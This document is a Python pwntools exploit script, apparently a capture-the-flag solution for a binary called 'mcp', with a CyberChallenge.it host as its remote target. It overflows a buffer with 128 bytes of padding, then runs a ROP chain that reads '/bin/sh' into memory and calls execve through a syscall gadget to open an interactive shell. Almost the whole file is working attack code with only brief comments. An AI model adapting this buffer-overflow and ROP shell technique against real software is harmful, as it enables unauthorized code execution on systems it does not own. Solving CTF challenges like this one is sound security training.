#!/usr/bin/env python3

from pwn import *

exe = ELF("./mcp")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])

        if args.DDEBUG:
            gdb.attach(r, '''
                b *0x4000f0
                ''')
    else:
        r = remote("mcp.challs.cyberchallenge.it", 9218)

    return r


def main():
    r = conn()

    # NOTE: At the end of 'main_func', the value of $rdi register is 1
    # Ropper is always there to help :D

    pop_r10_add_rdi_r10  = 0x0000000000400153       # pop r10; add rdi, r10; ret;
    pop_rdx_add_rdi_r10  = 0x0000000000400154       # pop rdx; add rdi, r10; ret;
    pop_rsi              = 0x0000000000400159       # pop rsi; ret
    mov_eax_0x3b_syscall = 0x0000000000400161       # mov eax, 0x3b; syscall; ret;
    bin_sh               = 0x6001b2                 # String location previously used for the "banner"
    read_func            = 0x400138

    # /* PADDING */
    payload =  b'A' * 128                                               # PADDING

    # /* READ INPUT TO GIVEN LOCATION */
    payload += p64(pop_rsi) + p64(bin_sh) + p64(read_func)

    # /* SPAWN SHELL */
    payload += p64(pop_r10_add_rdi_r10) + p64(bin_sh // 2)              # String location (added two times so value is halved)
    payload += p64(pop_rdx_add_rdi_r10) + p64(0)                        # ENVP pointer to NULL
    payload += p64(pop_rsi) + p64(0)                                    # ARGV pointer to NULL
    payload += p64(mov_eax_0x3b_syscall)                                # LOL WUT? Why is there a syscall to execve?

    # Send payload
    r.sendlineafter(b'Who\'s your User?\n', payload)

    # input('Press ENTER to send the string')       # NOTE: uncomment in case the script was too fast (usually in LOCAL)
    r.sendline(b'/bin/sh\x00')
    r.interactive('$ ')


if __name__ == "__main__":
    main()
